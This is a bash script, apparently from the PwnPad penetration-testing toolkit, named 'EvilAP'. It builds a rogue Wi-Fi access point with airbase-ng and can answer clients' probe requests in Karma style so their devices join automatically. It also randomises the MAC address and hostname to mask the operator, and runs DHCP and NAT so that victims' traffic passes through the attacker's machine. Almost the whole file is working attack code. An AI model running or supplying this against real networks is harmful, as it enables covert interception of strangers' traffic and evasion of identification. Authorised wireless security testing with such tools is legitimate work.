#!/bin/bash
# Desc: EvilAP script to forcefully connect wireless clients
#set the prompt to the name of the script
PS1=${PS1//@\\h/@evilap}
clear

#this block controls the features for px_interface_selector
include_extwifi=0
include_monitor=0
include_airbase=0
include_cell=1
include_usb=0 #the computer thinks we are sharing internet, not the other way
#this interface selection is for the uplink, attack always uses external wifi
default_interface=gsm_int
message="be used for Internet uplink"
. /opt/pwnix/pwnpad-scripts/px_functions.sh

f_endclean(){
  printf "\n[-] Exiting...\n"
  f_restore_ident
  f_clean_up
  EXIT_NOW=1
}

f_clean_up(){
  printf "[-] Killing any instances of airbase or dhcpd\n"
  killall airbase-ng &> /dev/null
  killall dhcpd &> /dev/null
  f_mon_disable
  iptables --flush
  iptables --table nat --flush
}

f_restore_ident(){
  printf "[+] Restoring network identity\n"
  hostn=`cat /etc/hostname`
  ifconfig wlan1mon down &> /dev/null
  macchanger -p wlan1mon &> /dev/null
  hostname $hostn
}

f_banner(){
  printf "\n[+] Welcome to EvilAP\n\n"
}

f_ssid(){
  clear
  printf "\n[+] Enter an SSID name\n"
  printf "[-] Default SSID: [Public_Wireless]\n\n"
  read -p "SSID: " ssid

  if [ -z $ssid ]; then
    ssid=Public_Wireless
  fi
}

f_channel(){
  clear
  [ -n "$channel" ] && printf "\nChannel $channel is ${1:-invalid}.\n"
  printf "\n[+] Please enter a channel to run EvilAP on (Default: 1).\n\n"
  [ -n "${twofour_channels}" ] && printf "Available 2.4 GHz channels are: ${twofour_channels}\n"
  [ -n "${five_channels}" ] && printf "Available 5 GHz channels are: ${five_channels}\n"
  printf "\n"

  unset channel
  read -p "Channel: " channel

  [ -z "$channel" ] && channel=1
  f_validate_channel wlan1mon $channel
  RETCODE=$?
  case $RETCODE in
    0) return 0 ;;
    2) f_channel "not in the supported channel list" ;;
    3) f_channel "not supported in the current regulatory domain" ;;
    *) f_channel ;;
  esac
  return 1
}

f_beacon_rate(){
  clear
  printf "\n[+] Enter the beacon rate at which to broadcast probe requests:\n\n"
  printf "[!] If clients don't stay connected try changing this value\n\n"
  printf "[-] Default is: [30]\n\n"
  read -p "Range [20-70]: " brate

  if [ -z $brate ]; then
    brate=30
  fi
}

f_preplaunch(){
  #Change the hostname and mac address randomly
  printf "\n[+] Rolling MAC address and hostname randomly\n\n"

  ifconfig wlan1mon down

  hn=`ifconfig wlan1mon |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
  hostname $hn
  printf "[+] New hostname set: $hn\n"

  sleep 2
  #interface is already in monitor mode
  ifconfig wlan1mon down
  macchanger -r wlan1mon
  ifconfig wlan1mon up

  mkdir /dev/net/ &> /dev/null
  ln -s /dev/tun /dev/net/tun &> /dev/null
  killall airbase-ng &> /dev/null
  killall dhcpd &> /dev/null
  iptables --flush
  iptables --table nat --flush
}

f_logname(){
  printf "/opt/pwnix/captures/wireless/evilap-$(date +%s).log\n"
}

f_evilap(){
  #Log path and name
  logname=$(f_logname)
  printf "[+] Creating new logfile: $logname\n"

  #Start Airbase-ng with -P for preferred networks
  airbase-ng -P -C $brate -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  printf 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  tail -f $logname
}

f_niceap(){
  #Log path and name
  logname=$(f_logname)
  printf "[+] Creating new logfile: $logname\n"

  #Start Airbase-ng with -P for preferred networks
  airbase-ng -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  printf 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  tail -f $logname
}

f_karmaornot(){
  clear
  printf "\n[?] Force clients to connect with their probe requests?\n\n"
  printf "[!] Everything will start connecting to you if YES is selected!\n\n"
  printf "1. Yes\n"
  printf "2. No\n\n"
  read -p "Choice [1-2]: " karma
  case $karma in
    1)
      printf "[+] Starting EvilAP with forced connection attack\n"
      f_beacon_rate
      f_preplaunch
      trap f_endclean INT
      trap f_endclean KILL
      f_evilap
      ;;
    2)
      printf "[+] Starting EvilAP without forced connection attack\n"
      f_preplaunch
      trap f_endclean INT
      trap f_endclean KILL
      f_niceap
      ;;
    *) f_karmaornot ;;
  esac
}

f_mon_enable
if [ "$?" = "0" ]; then
  EXIT_NOW=0
  [ "$EXIT_NOW" = 0 ] && f_banner
  [ "$EXIT_NOW" = 0 ] && require_ip=1 f_interface
  [ "$EXIT_NOW" = 0 ] && f_ssid
  [ "$EXIT_NOW" = 0 ] && f_channel_list wlan1mon
  [ "$EXIT_NOW" = 0 ] && f_channel
  [ "$EXIT_NOW" = 0 ] && f_karmaornot
  [ "$EXIT_NOW" = 0 ] && f_endclean
fi
